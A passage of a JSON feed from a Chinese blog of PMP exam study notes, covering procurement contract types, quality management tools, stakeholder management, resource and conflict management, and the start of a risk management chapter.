        "PMP"
      ]
    },
    {
      "title": "第十二章：项目采购管理",
      "url": "https://vxhly.github.io/pmp/knowledge/project-purchasing-management.html",
      "id": "https://vxhly.github.io/pmp/knowledge/project-purchasing-management.html",
      "summary": "前言\n记录项目采购管理章节的相关知识、频繁考点。\n\n",
      "content_html": "<div><p>前言</p>\n<p>记录项目采购管理章节的相关知识、频繁考点。</p>\n</div>\n\n<h2 id=\"核心概念\" tabindex=\"-1\"> 核心概念</h2>\n<div><p>提示</p>\n<p>项目经理不必成为采购管理法律法规领域的专家, 但是应该对采购过程有足够的了解。采购管理的过程包括规划采购管理、实施采购、控制采购和结束采购四个环节。</p>\n</div>\n<p>通常情况下, 项目经理无权签署对组织有约束力的法律协议, 这项工作仅由具备相关职权的人员执行。</p>\n<p>因应用领域不同, 协议可以是合同、服务水平协议（SLA）、谅解备忘录、协议备忘录（MOA）或订购单。</p>\n<h2 id=\"思维导图\" tabindex=\"-1\"> 思维导图</h2>\n<p><img src=\"/assets/project-purchasing-management.png\" alt=\"项目采购管理\"></p>\n<h2 id=\"规划过程组\" tabindex=\"-1\"> 规划过程组</h2>\n<h3 id=\"规划采购管理\" tabindex=\"-1\"> 规划采购管理</h3>\n<p>规划采购管理是记录项目采购决策、明确采购方法, 及识别潜在卖方的过程。</p>\n<p>作用：确定是否从项目外部获取货物和服务。如果是, 则还要确定将在什么时间、以什么方式获取什么货物和服务。</p>\n<h4 id=\"总价合同\" tabindex=\"-1\"> 总价合同</h4>\n<ul>\n<li>固定总（FFP） =&gt; 价格固定不变（除非工作范围变更）;适用于：已明确定义需求, 且不会出现重大范围变更的情况下使用;此类合同为既定产品、服务或成果的采购设定一个总价</li>\n<li>总价+激励（FPIF） =&gt; 最高限价、有目标绩效、有分摊比例\n<ul>\n<li>总价 = 实际成本 + 目标利润 +（目标成本 - 实际成本）* 卖方应承担比例</li>\n<li>和最高限价比较, 计算最终总价</li>\n<li>利润 = 最终总价 - 实际成本</li>\n</ul>\n</li>\n<li>总价加经济价格调整（FP-EPA） =&gt; 跨越较长时期（数年）、考虑通货膨胀、成本增降</li>\n</ul>\n<div><p>固定总价合同（FFP）</p>\n<p>FFP 是最常用的合同类型。大多数买方都喜欢这种合同</p>\n<ul>\n<li>因为采购的价格在一开始就确定, 并且不允许改变（除非工作范围发生变更）。</li>\n<li>卖方有义务完成工作, 并且承担因不良绩效导致的任何成本增加。</li>\n<li>在 FFP 合同下, 买方应该准确定义拟采购的产品和服务, 对采购规范的任何变更都会增加买方的成本</li>\n</ul>\n</div>\n<div><p>总价加激励费用合同（FPIF）</p>\n<p>允许一定的绩效偏离, 并对实现既定目标给与相关的财务奖励（通常取决于卖方的成本、进度或技术绩效）。</p>\n<ul>\n<li>在 FPIF 合同中, 要设置价格上限, 卖方必须完成工作并且要承担高于上限的全部成本。</li>\n</ul>\n</div>\n<div><p>总价加经济价格调整合同（FPEPA）</p>\n<p>适用于：卖方履约期将跨越几年；将以不同货币支付价款。</p>\n<ul>\n<li>允许根据条件变化（如通货膨胀、某些特殊商品的成本增降), 以事先确定的方式对合同价格进行最终调整。</li>\n</ul>\n</div>\n<h4 id=\"工料合同\" tabindex=\"-1\"> 工料合同</h4>\n<ul>\n<li>T&amp;M =&gt; 工期短、金额小、不复杂、紧急情况、无 SOW</li>\n<li>兼具成本补偿合同和总价合同的某些特点的混合型合同</li>\n<li>适用于, 在无法快速编制出准确的工作说明书的情况下扩充人员、聘用专家或寻求外部支持。</li>\n</ul>\n<h4 id=\"成本补偿合同\" tabindex=\"-1\"> 成本补偿合同</h4>\n<p>向卖方支付为完成工作而发生的全部合法实际成本（可报销成本）, 外加一笔费用作为卖方的利润;适用于：工作范围预计会在合同执行期间发生重大变更</p>\n<ul>\n<li>成本+激励（CPIF） =&gt; 可能有利润上下限、有目标绩效、有分摊比例\n<ul>\n<li>利润 = 目标利润 + （目标成本 - 实际成本）* 卖方应承担比例</li>\n<li>和利润上下限比, 技术最终利润</li>\n<li>总价 = 最终利润 + 实际成本</li>\n</ul>\n</li>\n<li>成本+奖励（CPAF） =&gt; 绩效标准主观笼统、不允许申诉</li>\n<li>成本+固定费用（CPFF） =&gt; 初始成本估算的百分比, 不考虑绩效\n<ul>\n<li>实际总价 = 实际成本+初始成本百分比</li>\n</ul>\n</li>\n</ul>\n<div><p>成本加固定费用合同（CPFF）</p>\n<p>为卖方报销履行合同工作所发生的一切可列支成本, 并向卖方支付一笔固定费用, 该费用以项目初始成本估算的某一百分比计算。</p>\n</div>\n<div><p>成本加激励费用（CPIF）</p>\n<p>为卖方报销履行合同工作所发生的一切可列支成本, 并在卖方达到合同规定的绩效目标时, 向卖方支付预先确定的激励费用。</p>\n<ul>\n<li>在 CPIF 合同中, 如果最终成本低于或高于原始估算成本, 则买方和卖方需要根据事先商定的成本分摊比例来分享节约部分或分担超出部分。</li>\n<li>与总价加激励费用相比, 不存在总价上的最高限价。</li>\n<li>但有时会出现利润的最高限价和最低限价。</li>\n</ul>\n</div>\n<div><p>成本加奖励费用（CPAF）</p>\n<p>为卖方报销一切合法成本, 但只有在卖方满足合同规定的、某些笼统主观的绩效标准的情况下, 才向卖方支付大部分费用。</p>\n<ul>\n<li>完全由买方根据自己对卖方绩效的主观判断来决定奖励费用, 并且通常不允许申诉.</li>\n</ul>\n</div>\n<h4 id=\"itto\" tabindex=\"-1\"> ITTO</h4>\n<p>预先批准的卖方清单----经过适当审查的卖方清单可以简化招标所需的步骤, 并缩短卖方甄选过程的时间</p>\n<p>采购工作说明书：充分详细地描述拟采购的产品、服务或成果, 以便潜在卖方确定是否有能力提供此类产品、服务或成果。采购工作说明书应力求清晰、完整和简练。它需要说明所需的附加服务,\n例如, 报告绩效, 或对采购品的后续运营支持。在采购过程中, 应根据需要对工作说明书进行修订, 直到它成为所签协议的一部分。</p>\n<p><img src=\"/assets/project-purchasing-management-1.png\" alt=\"项目采购管理-规划采购管理\"></p>\n<h2 id=\"实施过程组\" tabindex=\"-1\"> 实施过程组</h2>\n<h3 id=\"实施采购\" tabindex=\"-1\"> 实施采购</h3>\n<p>实施采购是获取卖方应答、选择卖方并授予合同的过程。主要作用是, 选定合格卖方并签署关于货物或服务交付的法律协议。</p>\n<h4 id=\"itto-1\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-purchasing-management-2.png\" alt=\"项目采购管理-实施采购管理\"></p>\n<h2 id=\"监控过程组\" tabindex=\"-1\"> 监控过程组</h2>\n<h3 id=\"控制采购\" tabindex=\"-1\"> 控制采购</h3>\n<p>控制采购是管理采购关系, 监督合同绩效, 实施必要的变更和纠偏, 以及关闭合同的过程。</p>\n<h4 id=\"合同提前终止\" tabindex=\"-1\"> 合同提前终止</h4>\n<p>合同提前终止是结束采购的一个特例, 有以下三种情况会提前终止：</p>\n<ol>\n<li>合同可由双方协商一致而提前终止,</li>\n<li>或因一方违约而提前终止,</li>\n<li>或者为买方的便利而提前终止（如果合同中有这种规定）。</li>\n</ol>\n<p>如果合同提前终止：</p>\n<ol>\n<li>对该合同或该部分中已经完成和验收的工作支付报酬</li>\n<li>对卖方为该合同或该部分所做的准备工作给予补偿</li>\n</ol>\n<h4 id=\"itto-2\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-purchasing-management-3.png\" alt=\"项目采购管理-实施采购管理\"></p>\n",
      "image": "https://vxhly.github.io/assets/project-purchasing-management.png",
      "date_published": "2022-08-15T19:50:00.000Z",
      "date_modified": "2022-09-04T12:02:59.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "PMP"
      ]
    },
    {
      "title": "第八章：项目质量管理",
      "url": "https://vxhly.github.io/pmp/knowledge/project-quality-management.html",
      "id": "https://vxhly.github.io/pmp/knowledge/project-quality-management.html",
      "summary": "前言\n记录项目质量管理章节的相关知识、频繁考点。\n\n",
      "content_html": "<div><p>前言</p>\n<p>记录项目质量管理章节的相关知识、频繁考点。</p>\n</div>\n\n<h2 id=\"核心概念\" tabindex=\"-1\"> 核心概念</h2>\n<div><p>提示</p>\n<p>项目质量管理主要包含了规划质量管理、管理质量、控制质量三个过程, 目的是做出合格的质量、建立信心(客户/团队)\n、满足特定的需求和期望、审计质量要求和质量控制测量结果和改进生产过程。</p>\n</div>\n<p>项目质量管理需要兼顾项目管理与项目可交付成果两个方面。</p>\n<ul>\n<li>【质量】作为实现的性能或成果, 是“一系列内在特性满足要求的程度”。</li>\n<li>【等级】作为设计意图, 是对用途相同但技术特性不同的可交付成果的级别分类。</li>\n</ul>\n<p>五种质量管理水平：客户 &lt; QC &lt; QA &lt; QP &lt; 文化。</p>\n<ul>\n<li>【预防】=&gt; 保证过程总共不出现错误</li>\n<li>【检查】=&gt; 保证错误不落到客户手中</li>\n<li>【属性抽样】=&gt; 结果为合格或不合格</li>\n<li>【变量抽样】=&gt; 表明合格的程度</li>\n<li>【公差】=&gt; 结果的可接受范围</li>\n<li>【控制界限】=&gt; 稳定过程的普通偏差的边界</li>\n</ul>\n<p>项目经理及项目管理团队负责权衡, 以便同时达到所要求的质量与等级水平。</p>\n<p>项目质量管理的核心概念 =&gt; 按有效性递增的五种质量管理水平</p>\n<h2 id=\"思维导图\" tabindex=\"-1\"> 思维导图</h2>\n<p><img src=\"/assets/project-quality-management.png\" alt=\"项目质量管理\"></p>\n<h2 id=\"项目质量管理流程\" tabindex=\"-1\"> 项目质量管理流程</h2>\n<p><img src=\"/assets/project-quality-management-0.png\" alt=\"项目质量管理\"></p>\n<h2 id=\"规划过程组\" tabindex=\"-1\"> 规划过程组</h2>\n<h3 id=\"规划质量管理\" tabindex=\"-1\"> 规划质量管理</h3>\n<p>规划质量管理是识别项目及其可交付成果的质量要求和（或）标准, 并书面描述项目将如何证明符合质量要求和（或）标准的过程。</p>\n<p>主要作用是, 为在整个项目期间如何管理和核实质量提供指南和方向。</p>\n<h4 id=\"itto\" tabindex=\"-1\"> ITTO</h4>\n<p>组织过程资产 =&gt; 执行组织的质量政策是高级管理层所推崇的, 规定了组织在质量管理方面的工作。</p>\n<p>质量成本（不包含生产成本） =&gt; 在产品生命周期中为预防不符合要求, 为评价产品或服务是否符合要求, 以及因未达到要求（返工）,\n而发生的所有成本。</p>\n<ul>\n<li>一致性成本（为了防止失败）\n<ul>\n<li>预防成本（培训、设备、流程文档化、选择正确时间）</li>\n<li>评价成本（检查、测试、破坏性测试）</li>\n</ul>\n</li>\n<li>非一致性成本（为了处理失败）\n<ul>\n<li>内部失败成本（返工、废品）</li>\n<li>外部失败成本（债务、保修、业务流失）</li>\n</ul>\n</li>\n</ul>\n<p>流程图 =&gt; 可以通过分析流程图来估算质量成本。通过展示过程步骤, 可帮助改进过程并识别可能出现质量缺陷或可以纳入质量检查的地方。</p>\n<p><img src=\"/assets/project-quality-management-1.png\" alt=\"项目质量管理-规划质量管理\"></p>\n<h3 id=\"管理质量\" tabindex=\"-1\"> 管理质量</h3>\n<div><p>提示</p>\n<p>主要针对过程的管理, 老版本中叫“质量保证”, QA。代表的工具为质量审计, 用于管理过程。</p>\n</div>\n<p>管理质量是把组织的质量政策用于项目, 并将质量管理计划转化为可执行的质量活动的过程。主要作用是, 提高实现质量目标的可能性,\n以及识别无效过程和导致质量低劣的原因。</p>\n<p>在敏捷项目中, 整个项目期间的质量管理由所有团队成员执行；但在传统项目中, 质量管理通常是特定团队成员的职责。</p>\n<h4 id=\"itto-1\" tabindex=\"-1\"> ITTO</h4>\n<ul>\n<li>亲和图：可以对潜在缺陷成因进行分类, 展示最应关注的领域。</li>\n<li>因果图：“鱼骨图”、“why-why 分析图”和“石川图”, 找根本原因。</li>\n<li>直方图：一种展示数字数据的条形图, 可以展示每个可交付成果的缺陷数量、缺陷成因的排列、各个过程的不合规次数,\n或项目或产品缺陷的其他表现形式。</li>\n<li>帕累托：二八原则, 累积频率, 找主要原因, 便于有针对性地解决问题。</li>\n<li>散点图：展示两个变量之间的关系的图形。</li>\n<li>（质量）审计：于确定项目活动是否遵循了组织和项目的政策、过程与程序的一种结构化且独立的过程；包括：1 识别, 2 分享, 3 协助, 4\n积累, 5 确 认；可事先安排, 也可随机进行；可由内部或外部审计师进行。</li>\n<li>面向 X 的设计 (DfX) ：产品设计期间可采用的一系列技术指南, 旨在优化设计的特定方面。</li>\n<li>问题解决：1 定义, 2 识别, 3 方案, 4 选择, 5 执行, 6 验证。</li>\n<li>质量改进方法：PDCA, 六西格玛。</li>\n<li>控制图：显示过程是否稳定、是否有可预测的绩效</li>\n</ul>\n<p>质量测量指标 =&gt; 描述项目或产品属性, 以及控制质量过程将如何验证符合程度。（属于“项目文件“）</p>\n<p>质量审计是识别改进领域的工具之一, 是一种独立审查、确保项目执行过程符合组织或项目定义的方针政策、标准和程序。</p>\n<p>质量审计的目标</p>\n<ul>\n<li>识别最佳实践、违规做法、差距及不足</li>\n<li>分享类似项目的良好实践</li>\n<li>协助过程改进、提高生产效率</li>\n<li>积累经验教训</li>\n<li>确认已批准的变更请求的实施情况</li>\n</ul>\n<p>过程分析 =&gt; 识别过程改进机会, 发现一个过程中存在的问题、制约因素、和非增值活动。</p>\n<p><img src=\"/assets/project-quality-management-2.png\" alt=\"项目质量管理-管理质量\"></p>\n<h2 id=\"控制过程组\" tabindex=\"-1\"> 控制过程组</h2>\n<h3 id=\"控制质量\" tabindex=\"-1\"> 控制质量</h3>\n<div><p>提示</p>\n<p>主要针对结果的检查, QC。代表的工具为检查, 泳衣检查结果。</p>\n</div>\n<p>核实项目可交付成果和工作已经达到主要相关方的质量要求, 可供最终验收。</p>\n<p>由于缺陷, 客户拒绝交付, 若要避免这个问题, 项目经理事先应该定期检查核实可交付成果。</p>\n<p>在可交付成果中发现大量缺陷：</p>\n<ul>\n<li>少量部分 =&gt; 查原因、走变更流程</li>\n<li>大量部分 =&gt; 审查过程、过程改进</li>\n</ul>\n<p><img src=\"/assets/project-quality-management-3.png\" alt=\"项目质量管理-控制质量\"></p>\n",
      "image": "https://vxhly.github.io/assets/project-quality-management.png",
      "date_published": "2022-07-27T19:20:00.000Z",
      "date_modified": "2022-09-01T15:03:55.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "PMP"
      ]
    },
    {
      "title": "第十三章：项目相关方管理",
      "url": "https://vxhly.github.io/pmp/knowledge/project-related-party-management.html",
      "id": "https://vxhly.github.io/pmp/knowledge/project-related-party-management.html",
      "summary": "前言\n记录项目相关方管理章节的相关知识、频繁考点。\n\n",
      "content_html": "<div><p>前言</p>\n<p>记录项目相关方管理章节的相关知识、频繁考点。</p>\n</div>\n\n<h2 id=\"核心概念\" tabindex=\"-1\"> 核心概念</h2>\n<div><p>提示</p>\n<p>项目始于干系人需求, 终于干系人满意。项目干系人是指受项目影响或能影响项目的任何个人、小组或组织, 也可以说, 与项目有直接或间接关系的任何个人、小组或组织, 都是项目干系人。项目干系人管理应该按照如下步骤开展：识别干系人、规划干系人管理、管理干系人参与和控制干系人参与。</p>\n<p>项目干系人管理是项目管理中的重要内容之一, 目的是调动积极因素, 化解消极影响, 确保项目成功。</p>\n</div>\n<p>相关方 =&gt; 会受到项目的积极或消极影响, 或者能对项目施加积极或消极的影响的任何人。</p>\n<p>相关方满意度应作为项目目标加以识别和管理。</p>\n<p>识别相关方和引导相关方参与的过程需要迭代开展, 至少要在以下时点开展这些活动：</p>\n<ol>\n<li>项目进入其生命周期的不同阶段；</li>\n<li>当前相关方不再与项目工作有关, 或者在项目的相关方社区中出现了新的相关方成员；</li>\n<li>组织内部或更大区域的相关方社区发生重大变化。</li>\n</ol>\n<h2 id=\"思维导图\" tabindex=\"-1\"> 思维导图</h2>\n<p><img src=\"/assets/project-related-party-management.png\" alt=\"项目相关方管理\"></p>\n<h2 id=\"启动过程组\" tabindex=\"-1\"> 启动过程组</h2>\n<h3 id=\"识别相关方\" tabindex=\"-1\"> 识别相关方</h3>\n<p>识别相关方是定期识别项目相关方, 分析和记录他们的利益、参与度、相互依赖性、影响力和对项目成功的潜在影响的过程。</p>\n<h4 id=\"itto\" tabindex=\"-1\"> ITTO</h4>\n<p>头脑写作：头脑风暴的改良形式, 让个人参与者有时间在小组创意讨论开始前单独思考问题。信息可通过面对面小组会议收集,\n或在由技术支持的虚拟环境中收集。</p>\n<p>相关方分析：相关方分析会产生相关方清单和关于相关方的各种信息, 包括：兴趣、权利、所有权、知识、贡献。</p>\n<p>权力利益方格、权力影响方格, 或作用影响方格</p>\n<p>权利 =&gt; 职权\n利益 =&gt; 对项目结果的关注程度\n影响 =&gt; 主动参与项目的程度\n作用 =&gt; 改变项目计划或执行的能力</p>\n<p>相关方登记册：身份信息、评估信息、相关方分类。</p>\n<p><img src=\"/assets/project-related-party-management-1.png\" alt=\"项目相关方管理-识别相关方\"></p>\n<h2 id=\"规划过程组\" tabindex=\"-1\"> 规划过程组</h2>\n<h3 id=\"规划相关方管理\" tabindex=\"-1\"> 规划相关方管理</h3>\n<p>根据相关方的需求、期望、利益和对项目的潜在影响, 制定项目相关方参与项目的方法的过程。本过程的主要作用是, 提供与相关方进行有效互动的可行计划。</p>\n<h4 id=\"itto-1\" tabindex=\"-1\"> ITTO</h4>\n<p>相关方参与计划：相关方参与计划可包括（但不限于）调动个人或相关方参与的特定策略或方法。</p>\n<p><img src=\"/assets/project-related-party-management-2.png\" alt=\"项目相关方管理-规划相关方管理\"></p>\n<h2 id=\"执行过程组\" tabindex=\"-1\"> 执行过程组</h2>\n<h3 id=\"管理相关方参与\" tabindex=\"-1\"> 管理相关方参与</h3>\n<p>与相关方进行沟通和协作以满足其需求与期望、处理问题, 并促进相关方合理参与的过程。主要作用是, 让项目经理能够提高相关方的支持,\n并尽可能降低相关方的抵制。</p>\n<p>管理相关方参与包括以下活动：</p>\n<ol>\n<li>在适当的项目阶段引导相关方参与, 以便获取、确认或维持他们对项目成功的持续承诺；</li>\n<li>通过谈判和沟通管理相关方期望；</li>\n<li>通过谈判和沟通管理相关方期望；</li>\n<li>澄清和解决已识别的问题。</li>\n</ol>\n<h4 id=\"itto-2\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-related-party-management-3.png\" alt=\"项目相关方管理-管理相关方参与\"></p>\n<h2 id=\"监控过程组\" tabindex=\"-1\"> 监控过程组</h2>\n<h3 id=\"监督相关方参与\" tabindex=\"-1\"> 监督相关方参与</h3>\n<p>监督项目相关方关系, 并通过修订参与策略和计划来引导相关方合理参与项目的过程。主要作用是, 随着项目进展和环境变化,\n维持或提升相关方参与活动的效率和效果。</p>\n<h4 id=\"itto-3\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-related-party-management-4.png\" alt=\"项目相关方管理-监督相关方参与\"></p>\n<h2 id=\"事先与事后\" tabindex=\"-1\"> 事先与事后</h2>\n<ul>\n<li>事先：早识别、早分析、早参与</li>\n<li>事后：管理相关方参与（或审查相关方参与计划）</li>\n</ul>\n",
      "image": "https://vxhly.github.io/assets/project-related-party-management.png",
      "date_published": "2022-08-03T21:10:00.000Z",
      "date_modified": "2022-09-01T15:03:55.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "PMP"
      ]
    },
    {
      "title": "第九章：项目资源管理",
      "url": "https://vxhly.github.io/pmp/knowledge/project-resource-management.html",
      "id": "https://vxhly.github.io/pmp/knowledge/project-resource-management.html",
      "summary": "前言\n记录项目资源管理章节的相关知识、频繁考点。\n\n",
      "content_html": "<div><p>前言</p>\n<p>记录项目资源管理章节的相关知识、频繁考点。</p>\n</div>\n\n<h2 id=\"核心概念\" tabindex=\"-1\"> 核心概念</h2>\n<div><p>提示</p>\n<p>人才是企业最重要的财富, 项目人力资源管理是项目管理的一个重要组成部分。项目人力资源管理的四个过程：制定人力资源计划、组建项目团队、建设项目团队和管理项目团队。</p>\n<p>项目经理必须做到对人要体谅和尊敬、明白什么能激励人、与人仔细沟通, 只有集中精力做好人力资源管理才能使下属很好的完成任务。</p>\n</div>\n<h3 id=\"激励理论\" tabindex=\"-1\"> 激励理论</h3>\n<ul>\n<li>马斯洛的需求层次理论 =&gt; 从最低等级到最高等级依次是：生理需求、安全需求、社交需求、尊重需求、自我实现需求</li>\n<li>赫兹伯格的双因素理论 =&gt; 保健因素、激励因素\n<ul>\n<li>保健因素 =&gt; 是导致不满足的因素, 这些因素做得好不会提高激励, 做的不好就会损害激励</li>\n<li>激励因素 =&gt; 是导致满足感的因素, 能够真正起激励作用的。</li>\n</ul>\n</li>\n<li>麦格雷戈的 X 理论和 Y 理论\n<ul>\n<li>X 理论认为只能用低层次的需求进行激励</li>\n<li>Y 理论认为人更应该受到高层次需求的激励, 鼓励团队成员参与到目标的制定中, 没有严格的等级和监控制度</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"思维导图\" tabindex=\"-1\"> 思维导图</h2>\n<p><img src=\"/assets/project-resource-management.png\" alt=\"项目资源管理\"></p>\n<h2 id=\"规划过程组\" tabindex=\"-1\"> 规划过程组</h2>\n<h3 id=\"规划资源管理\" tabindex=\"-1\"> 规划资源管理</h3>\n<p>规划资源管理是定义如何估算、获取、管理和利用团队以及实物资源的过程。</p>\n<p>数据表现-层级型：</p>\n<ul>\n<li>工作分解结构 WBS =&gt; 可交付成果为导向的工作层级分解, 有助于明确高层级的指责</li>\n<li>组织分解结构 OBS =&gt; 组织的部门, 单元或团队为导向的成绩分解, 有助于查看对应的全部项目职责</li>\n<li>资源分解结构 RBS =&gt; 资源的类别和类型为导向的层级分解, 用于规划、管理和监控项目工作</li>\n</ul>\n<p>RACI 矩阵 =&gt; RACI 矩阵对明确划分角色和期望特别有用。RACI 中每个活动只肯能有一个 “A（负责）”</p>\n<ul>\n<li>R =&gt; 执行；A =&gt; 负责；C =&gt; 咨询；I =&gt; 知情</li>\n<li>反应与每个人相关的所有活动</li>\n<li>反应与每项活动相关的人员</li>\n<li>确保任何一项任务都只有一个人负责, 从而避免职责不清</li>\n</ul>\n<p>资源管理计划：资源管理计划提供了关于如何分类、分配、管理和释放项目资源的指南。包括：\n角色与职责：</p>\n<ul>\n<li>\n<p>角色：在项目中, 某人承担的职务或分配给某人的职务。</p>\n</li>\n<li>\n<p>职权：使用项目资源、做出决策、签字批准、验收可交付成果并影响他人开展项目工作的权力。</p>\n</li>\n<li>\n<p>职责：为完成项目活动, 项目团队成员必须履行的职责和工作。</p>\n</li>\n<li>\n<p>能力：为完成项目活动, 项目团队成员需具备的技能和才干。</p>\n</li>\n<li>\n<p>项目组织图：项目组织图以图形方式展示项目团队成员及其报告关系。</p>\n</li>\n<li>\n<p>培训：针对项目成员的培训策略。</p>\n</li>\n<li>\n<p>团队建设：建设项目团队的方法。</p>\n</li>\n<li>\n<p>认可计划：将给予团队成员哪些认可和奖励, 以及何时给予。</p>\n</li>\n</ul>\n<p>团队章程：为团队创建团队价值观、共识和工作指南的文件。尽早认可并遵守明确的规则, 有助于减少误解, 提高生产力；可定期审查和更新团队章程,\n确保团队始终了解团队基本规则, 并指导新成员融入团队。</p>\n<h4 id=\"itto\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-resource-management-1.png\" alt=\"项目资源管理-规划资源管理\"></p>\n<h3 id=\"估算活动资源\" tabindex=\"-1\"> 估算活动资源</h3>\n<p>估算执行项目所需的团队资源, 材料、设备和用品的类型和数量的过程。</p>\n<h4 id=\"itto-1\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-resource-management-2.png\" alt=\"项目资源管理-估算活动资源\"></p>\n<h2 id=\"执行过程组\" tabindex=\"-1\"> 执行过程组</h2>\n<h3 id=\"获取资源\" tabindex=\"-1\"> 获取资源</h3>\n<p>获取资源是获取项目所需的团队成员、设施、设备、材料、用品和其他资源的过程。本过程的主要作用是, 概述和指导资源的选择,\n并将其分配给相应的活动。</p>\n<p>在获取项目资源过程中应注意下列事项：</p>\n<ol>\n<li>项目经理或项目团队应该进行有效谈判。</li>\n<li>不能获得项目所需的资源时会影响项目, 甚至可能导致项目取消。</li>\n<li>无法获得所需团队资源, 项目经理或项目团队可能不得不用替代资源。</li>\n</ol>\n<h4 id=\"itto-2\" tabindex=\"-1\"> ITTO</h4>\n<p>预分派 =&gt; 事先确定项目的实物或团队资源。</p>\n<ol>\n<li>竞标过程中承诺分派</li>\n<li>项目取决于特定人员的专有技能</li>\n<li>项目章程中指定</li>\n</ol>\n<p>虚拟团队 =&gt; 具有共同目标、在完成角色人物的过程中很少或没有时间面对面工作的一群人</p>\n<p>实物资源分配单：项目将使用的材料、设备、用品、地点和其他实物资源。</p>\n<p>项目团队派工单：记录了团队成员及其在项目中的角色和职责（花名册）。</p>\n<p>资源日历：资源何时可用, 可用多久。</p>\n<p><img src=\"/assets/project-resource-management-3.png\" alt=\"项目资源管理-获取资源\"></p>\n<h3 id=\"建设团队\" tabindex=\"-1\"> 建设团队</h3>\n<p>建设团队是提高工作能力, 促进团队成员互动, 改善团队整体氛围, 以提高项目绩效的过程。</p>\n<p>塔克曼阶梯理论：</p>\n<ul>\n<li>形成阶段：相互认识, 相互独立, 不一定开诚布公。</li>\n<li>震荡阶段：不同观点和意见, 有冲突。</li>\n<li>规范阶段：开始协同工作, 学习相互信任。</li>\n<li>成熟阶段：组织有序, 相互依靠, 平稳高效。</li>\n<li>解散阶段：释放人员, 解散团队。</li>\n</ul>\n<h4 id=\"itto-3\" tabindex=\"-1\"> ITTO</h4>\n<p>集中办公：增进沟通和集体感, 老版本中有“紧密矩阵”的说法。</p>\n<p>团队建设：各种活动（甚至开会）目的：协同工作、增强信任。是为了更好的协同工作。</p>\n<p>培训：包括旨在提高项目团队成员能力、减少成员之间的差异的全部活动。</p>\n<p>团队绩效评价：1.个人技能的改进, 2.团队能力的改进, 3.团队成员离职率的降低, 4.团队凝聚力的加强。</p>\n<p><img src=\"/assets/project-resource-management-4.png\" alt=\"项目资源管理-建设团队\"></p>\n<h3 id=\"管理团队\" tabindex=\"-1\"> 管理团队</h3>\n<p>管理团队是跟踪团队成员工作表现, 提供反馈, 解决问题并管理团队变更, 以优化项目绩效的过程。本过程的主要作用是,\n影响团队行为、管理冲突以及解决问题。</p>\n<h4 id=\"itto-4\" tabindex=\"-1\"> ITTO</h4>\n<p>成功的冲突管理可提高生产力, 改进工作关系。1.团队成员解决, 2.项目经理协助, 3.正式的程序, 包括惩戒措施。</p>\n<p>冲突来源：1.资源稀缺；2.进度优先级排序；3.个人工作风格差异；4.性格差异</p>\n<p>冲突管理的解决步骤：</p>\n<ol>\n<li>首先由项目团队成员负责解决</li>\n<li>冲突升级, 项目经理应提供协助（私下处理）</li>\n<li>如果破坏性冲突绩效存在, 则可使用正式程序, 包括采取惩戒措施</li>\n</ol>\n<p>五种常用的冲突解决方法：</p>\n<ul>\n<li>撤退/回避：从冲突中退出, 推迟, 推给他人解决。</li>\n<li>缓和/包容：强调一致而非差异；考虑其他方的需要。（求同存异）</li>\n<li>妥协/调解：部分解决问题, 一定程度上满意。</li>\n<li>强迫/命令：推行一方观点；通常通过权力强行解决紧急问题。</li>\n<li>合作/解决问题：综合考虑不同的观点和意见, 合作的态度和开放式对话达成共识, 引导各方达成共识和承诺。（最佳方式）</li>\n</ul>\n<p><img src=\"/assets/project-resource-management-5.png\" alt=\"项目资源管理-管理团队\"></p>\n<h2 id=\"控制过程组\" tabindex=\"-1\"> 控制过程组</h2>\n<h3 id=\"控制资源\" tabindex=\"-1\"> 控制资源</h3>\n<p>确保按计划为项目分配实物资源, 监督资源实际使用情况, 并采取必要纠正措施的过程。主要作用是, 确保资源适时适地可用于项目,\n且在不再需要时被释放。</p>\n<p>应在所有项目阶段和整个项目生命周期期间持续开展控制资源过程。</p>\n<h4 id=\"itto-5\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-resource-management-6.png\" alt=\"项目资源管理-控制资源\"></p>\n",
      "image": "https://vxhly.github.io/assets/project-resource-management.png",
      "date_published": "2022-08-01T19:20:00.000Z",
      "date_modified": "2022-09-01T15:03:55.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "PMP"
      ]
    },
    {
      "title": "第十一章：项目风险管理",
      "url": "https://vxhly.github.io/pmp/knowledge/project-risk-management.html",
      "id": "https://vxhly.github.io/pmp/knowledge/project-risk-management.html",
      "summary": "前言\n记录项目风险管理章节的相关知识、频繁考点。\n\n",
      "content_html": "<div><p>前言</p>\n<p>记录项目风险管理章节的相关知识、频繁考点。</p>\n</div>\n\n<h2 id=\"核心概念\" tabindex=\"-1\"> 核心概念</h2>\n<div><p>提示</p>\n<p>项目风险管理的目标在于提高正面风险的概率和影响, 降低负面风险的概率和影响, 从而提高项目成功的可能性。</p>\n</div>\n<p>项目风险管理的目标在于提高正面风险的概率和（或）影响, 降低负面风险的概率和（或）影响, 从而提高项目成功的可能性。</p>\n<p>项目的独特性带来风险。</p>\n<p>风险三要素：风险事件、概率、影响。</p>\n<p>单个项目风险是一旦发生, 会对一个或多个项目目标产生正面或负面影响的不确定事件或条件。</p>\n<p>整体项目风险是不确定性对项目整体的影响, 是相关方面临的项目结果正面和负面变异区间。它源于包括单个风险在内的所有不确定性。</p>\n<h3 id=\"三种性质的项目风险\" tabindex=\"-1\"> 三种性质的项目风险</h3>\n<ul>\n<li>已知-已知风险 =&gt; 已识别并分析过程的风险, 可对这些风险规划应对措施。（计入时间/成本）</li>\n<li>已知-未知风险 =&gt; 已识别, 但又无法主动管理的风险, 要分配一定的应急储备。（应急储备）</li>\n<li>未知-未知风险 =&gt; 无法进行主动管理, 因此需要分配一定的管理储备。（管理储备）</li>\n</ul>\n<h3 id=\"影响风险态度的因素\" tabindex=\"-1\"> 